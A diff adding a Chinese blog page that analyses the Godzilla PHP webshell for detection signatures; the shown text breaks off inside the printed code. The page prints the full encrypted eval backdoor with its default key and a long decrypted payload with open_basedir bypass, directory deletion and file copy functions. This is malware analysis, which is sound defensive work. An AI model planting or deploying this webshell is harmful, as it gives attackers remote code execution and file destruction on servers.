@@ -1,0 +1,986 @@
+<!DOCTYPE html>
+
+
+
+
+<html class="theme-next muse" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="webshell,Godzilla,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="giantbranch's blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="冰蝎v3.0 Beta 2放出来没多久，就被找到了固定长度的特征，过两天又更新了，加了一些随机字符，固定长度特征消失。 哥斯拉也有一定的优点，比冰蝎好一点，但是也存在固定长度的问题 实验环境控制端：win10 + 哥斯拉Godzilla V1.00服务端：Ubuntu 16.04 + Apache + PHP 7.0.33 以php为例的webshell分析php的webshell有两种，一种是p">
+<meta name="keywords" content="webshell,Godzilla">
+<meta property="og:type" content="article">
+<meta property="og:title" content="哥斯拉Godzilla PHP Webshell分析与检测特征提取">
+<meta property="og:url" content="https://www.giantbranch.cn/2020/08/18/哥斯拉Godzilla PHP Webshell分析与检测特征提取/index.html">
+<meta property="og:site_name" content="giantbranch&#39;s blog">
+<meta property="og:description" content="冰蝎v3.0 Beta 2放出来没多久，就被找到了固定长度的特征，过两天又更新了，加了一些随机字符，固定长度特征消失。 哥斯拉也有一定的优点，比冰蝎好一点，但是也存在固定长度的问题 实验环境控制端：win10 + 哥斯拉Godzilla V1.00服务端：Ubuntu 16.04 + Apache + PHP 7.0.33 以php为例的webshell分析php的webshell有两种，一种是p">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1598944013063.png">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1598947912468.png">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1599040561600.png">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1599040587791.png">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1599040623587.png">
+<meta property="og:updated_time" content="2023-10-13T13:14:33.130Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="哥斯拉Godzilla PHP Webshell分析与检测特征提取">
+<meta name="twitter:description" content="冰蝎v3.0 Beta 2放出来没多久，就被找到了固定长度的特征，过两天又更新了，加了一些随机字符，固定长度特征消失。 哥斯拉也有一定的优点，比冰蝎好一点，但是也存在固定长度的问题 实验环境控制端：win10 + 哥斯拉Godzilla V1.00服务端：Ubuntu 16.04 + Apache + PHP 7.0.33 以php为例的webshell分析php的webshell有两种，一种是p">
+<meta name="twitter:image" content="http://pic.giantbranch.cn/pic/1598944013063.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://www.giantbranch.cn/2020/08/18/哥斯拉Godzilla PHP Webshell分析与检测特征提取/">
+
+
+
+
+
+  <title>哥斯拉Godzilla PHP Webshell分析与检测特征提取 | giantbranch's blog</title>
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-121265336-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?e3a097ddc6964e154e65d478725ac9ed";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">giantbranch's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">忘掉掌声，按自己的方式，继续前行，跑过一生</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-book">
+          <a href="/book/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-book"></i> <br>
+            
+            读过的书
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
+            
+            站点地图
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://www.giantbranch.cn/2020/08/18/哥斯拉Godzilla PHP Webshell分析与检测特征提取/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="giantbranch">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="giantbranch's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">哥斯拉Godzilla PHP Webshell分析与检测特征提取</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-08-18T00:00:00+00:00">
+                2020-08-18
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2020/08/18/哥斯拉Godzilla PHP Webshell分析与检测特征提取/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2020/08/18/哥斯拉Godzilla PHP Webshell分析与检测特征提取/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>冰蝎v3.0 Beta 2放出来没多久，就被找到了固定长度的特征，过两天又更新了，加了一些随机字符，固定长度特征消失。</p>
+<p>哥斯拉也有一定的优点，比冰蝎好一点，但是也存在固定长度的问题</p>
+<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>控制端：win10 + 哥斯拉Godzilla V1.00<br>服务端：Ubuntu 16.04 + Apache + PHP 7.0.33</p>
+<h1 id="以php为例的webshell分析"><a href="#以php为例的webshell分析" class="headerlink" title="以php为例的webshell分析"></a>以php为例的webshell分析</h1><p>php的webshell有两种，一种是php_xor_base64，另一种是php_xor_raw</p>
+<h2 id="php-xor-base64"><a href="#php-xor-base64" class="headerlink" title="php_xor_base64"></a>php_xor_base64</h2><p>首先看php_xor_base64</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    session_start();</span><br><span class="line">    @set_time_limit(0);</span><br><span class="line">	@error_reporting(0);</span><br><span class="line">    function E($D,$K)&#123;</span><br><span class="line">        for($i=0;$i&lt;strlen($D);$i++) &#123;</span><br><span class="line">            $D[$i] = $D[$i]^$K[$i+1&amp;15];</span><br><span class="line">        &#125;</span><br><span class="line">        return $D;</span><br><span class="line">    &#125;</span><br><span class="line">    function Q($D)&#123;</span><br><span class="line">        return base64_encode($D);</span><br><span class="line">    &#125;</span><br><span class="line">    function O($D)&#123;</span><br><span class="line">        return base64_decode($D);</span><br><span class="line">    &#125;</span><br><span class="line">    $P=&apos;pass&apos;;</span><br><span class="line">    $V=&apos;payload&apos;;</span><br><span class="line">    $T=&apos;3c6e0b8a9c15224a&apos;;</span><br><span class="line">    if (isset($_POST[$P]))&#123;</span><br><span class="line">        $F=O(E(O($_POST[$P]),$T));</span><br><span class="line">        if (isset($_SESSION[$V]))&#123;</span><br><span class="line">            $L=$_SESSION[$V];</span><br><span class="line">            $A=explode(&apos;|&apos;,$L);</span><br><span class="line">            class C&#123;public function nvoke($p) &#123;eval($p.&quot;&quot;);&#125;&#125;</span><br><span class="line">            $R=new C();</span><br><span class="line">			$R-&gt;nvoke($A[0]);</span><br><span class="line">            echo substr(md5($P.$T),0,16);</span><br><span class="line">            echo Q(E(@run($F),$T));</span><br><span class="line">            echo substr(md5($P.$T),16);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $_SESSION[$V]=$F;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>密码是$P，也即pass</p>
+<p>他是加密通信的，密钥生成shell的时候配置的，默认是key，md5后的前十六位，就是上面的<code>$T=&#39;3c6e0b8a9c15224a&#39;;</code>，这个跟冰蝎v3.0的密钥格式是一致的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substr(md5(&apos;key&apos;)),0,16)==&apos;3c6e0b8a9c15224a&apos;</span><br></pre></td></tr></table></figure>
+
+<p>这个代码单单这么看是看不出什么，$F是我们的输入，这有两种情况</p>
+<p>1、不存在<code>$_SESSION[$V]</code>，$F就赋值给<code>$_SESSION[$V]</code><br>2、存在的时候就，$F是run函数的参数</p>
+<p>你会发现在这个php中没有run函数，那就只能在调用run之前动态生成了，也就是下面几行代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$L=$_SESSION[$V];</span><br><span class="line">$A=explode(&apos;|&apos;,$L);</span><br><span class="line">class C&#123;public function nvoke($p) &#123;eval($p.&quot;&quot;);&#125;&#125;</span><br><span class="line">$R=new C();</span><br><span class="line">$R-&gt;nvoke($A[0]);</span><br></pre></td></tr></table></figure>
+
+<p>可以看到存在<code>$_SESSION[$V]</code>的时候，每次都会定义一个C类，里面只有一个函数nvoke，里面是直接执行eval<br>而后面新建一个C类，并调用利用的nvoke函数，参数是<code>$A[0]</code>，<code>$A[0]</code>来源于<code>$_SESSION[$V]</code>经过|分割打散为数组的第一个元素（通过解密，你会发现<code>$_SESSION[$V]</code>里面没有|字符，可能是作者为了以后添加更多功能而设计的，所以没有|的<code>$_SESSION[$V]</code>,跟<code>$A[0]</code>的字符是一样的）</p>
+<p>为了更清晰地了解整个过程，我们添加下面代码通过输出变量的方式快速获取实际执行的明文代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(&quot;/var/www/html/Godzilla/info.txt&quot;, $F , FILE_APPEND | LOCK_EX);</span><br><span class="line">file_put_contents(&quot;/var/www/html/Godzilla/info.txt&quot;, &quot;--------------\n\n&quot; , FILE_APPEND | LOCK_EX);</span><br></pre></td></tr></table></figure>
+
+<p>通过这个我们得到了初次连接webshell的3次通信解密后的明文，整个过程如下图</p>
+<p><img src="http://pic.giantbranch.cn/pic/1598944013063.png" alt></p>
+<h3 id="第一次发送很多功能的PHP代码"><a href="#第一次发送很多功能的PHP代码" class="headerlink" title="第一次发送很多功能的PHP代码"></a>第一次发送很多功能的PHP代码</h3><p>下面是第一次发送解密后存在<code>$_SESSION[$V]</code>中的代码，可以看第一个函数就是run函数了！</p>
+<p>简单解析一下，在run函数里面，通过formatParameter函数将参数解析到全局变量$parameters中，最后执行evalFunc()执行对应的函数功能，最后用base64Encode返回结果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br></pre></td><td class="code"><pre><span class="line">$parameters=array();</span><br><span class="line"></span><br><span class="line">function run($pms)&#123;</span><br><span class="line">    formatParameter($pms.&apos;&amp;ILikeYou=&apos;.base64Encode(&apos;metoo&apos;));</span><br><span class="line"></span><br><span class="line">    if ($_SESSION[&quot;bypass_open_basedir&quot;]==true)&#123;</span><br><span class="line">        @bypass_open_basedir();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return base64Encode(evalFunc());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function bypass_open_basedir()&#123;</span><br><span class="line">    if(!@file_exists(&apos;bypass_open_basedir&apos;))&#123;</span><br><span class="line">        @mkdir(&apos;bypass_open_basedir&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">    @chdir(&apos;bypass_open_basedir&apos;);</span><br><span class="line">    @ini_set(&apos;open_basedir&apos;,&apos;..&apos;);</span><br><span class="line">    @$_Ei34Ww_sQDfq_FILENAME = @dirname($_SERVER[&apos;SCRIPT_FILENAME&apos;]);</span><br><span class="line">    @$_Ei34Ww_sQDfq_path = str_replace(&quot;\\&quot;,&apos;/&apos;,$_Ei34Ww_sQDfq_FILENAME);</span><br><span class="line">    @$_Ei34Ww_sQDfq_num = substr_count($_Ei34Ww_sQDfq_path,&apos;/&apos;) + 1;</span><br><span class="line">    $_Ei34Ww_sQDfq_i = 0;</span><br><span class="line">    while($_Ei34Ww_sQDfq_i &lt; $_Ei34Ww_sQDfq_num)&#123;</span><br><span class="line">        @chdir(&apos;..&apos;);</span><br><span class="line">        $_Ei34Ww_sQDfq_i++;</span><br><span class="line">    &#125;</span><br><span class="line">    @ini_set(&apos;open_basedir&apos;,&apos;/&apos;);</span><br><span class="line">    @rmdir($_Ei34Ww_sQDfq_FILENAME.&apos;/&apos;.&apos;bypass_open_basedir&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function formatParameter($pms)&#123;</span><br><span class="line">    global $parameters;</span><br><span class="line">    $pms=explode(&quot;&amp;&quot;,$pms);</span><br><span class="line">    foreach ($pms as $kv)&#123;</span><br><span class="line">        $kv=explode(&quot;=&quot;,$kv);</span><br><span class="line">        if (sizeof($kv)&gt;=2)&#123;</span><br><span class="line">            $parameters[$kv[0]]=base64Decode($kv[1]);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">function evalFunc()&#123;</span><br><span class="line">    @session_write_close();</span><br><span class="line">    $className=get(&quot;codeName&quot;);</span><br><span class="line">    $methodName=get(&quot;methodName&quot;);</span><br><span class="line">    if ($methodName!=null)&#123;</span><br><span class="line">        if (strlen(trim($className))&gt;0)&#123;</span><br><span class="line">            if ($methodName==&quot;includeCode&quot;)&#123;</span><br><span class="line">                return includeCode();</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                if (isset($_SESSION[$className]))&#123;</span><br><span class="line">                    return eval($_SESSION[$className]);</span><br><span class="line">                &#125;else&#123;</span><br><span class="line">                    return &quot;&#123;$className&#125; no load&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return $methodName();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return &quot;methodName Is Null&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">function deleteDir($p)&#123;</span><br><span class="line">    $m=@dir($p);</span><br><span class="line">    while(@$f=$m-&gt;read())&#123;</span><br><span class="line">        $pf=$p.&quot;/&quot;.$f;</span><br><span class="line">        @chmod($pf,0777);</span><br><span class="line">        if((is_dir($pf))&amp;&amp;($f!=&quot;.&quot;)&amp;&amp;($f!=&quot;..&quot;))&#123;</span><br><span class="line">            deleteDir($pf);</span><br><span class="line">            @rmdir($pf);</span><br><span class="line">        &#125;else if (is_file($pf)&amp;&amp;($f!=&quot;.&quot;)&amp;&amp;($f!=&quot;..&quot;))&#123;</span><br><span class="line">            @unlink($pf);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $m-&gt;close();</span><br><span class="line">    @chmod($p,0777);</span><br><span class="line">    return @rmdir($p);</span><br><span class="line">&#125;</span><br><span class="line">function deleteFile()&#123;</span><br><span class="line">    $F=get(&quot;fileName&quot;);</span><br><span class="line">    if(is_dir($F))&#123;</span><br><span class="line">        return deleteDir($F)?&quot;ok&quot;:&quot;fail&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return (file_exists($F)?@unlink($F)?&quot;ok&quot;:&quot;fail&quot;:&quot;fail&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function copyFile()&#123;</span><br><span class="line">    $srcFileName=get(&quot;srcFileName&quot;);</span><br><span class="line">    $destFileName=get(&quot;destFileName&quot;);</span><br><span class="line">    if (@is_file($srcFileName))&#123;</span><br><span class="line">        if (copy($srcFileName,$destFileName))&#123;</span><br><span class="line">            return &quot;ok&quot;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return &quot;fail&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    